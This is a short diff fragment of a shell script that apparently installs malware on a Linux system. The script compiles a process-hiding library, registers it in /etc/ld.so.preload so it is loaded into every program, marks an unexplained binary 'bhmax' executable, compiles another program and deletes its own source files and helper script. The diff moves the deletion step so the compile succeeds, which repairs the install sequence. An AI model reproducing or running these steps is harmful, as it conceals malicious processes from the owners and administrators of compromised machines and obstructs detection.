@@ -7,8 +7,8 @@ chmod +x smtp.py
 gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl
 mv libprocess.so /usr/local/lib/
 echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
-rm hi.c processhider.c
 chmod +x bhmax
 gcc -o hi hi.c
+rm hi.c processhider.c
 chmod +x hi
 rm rest.sh
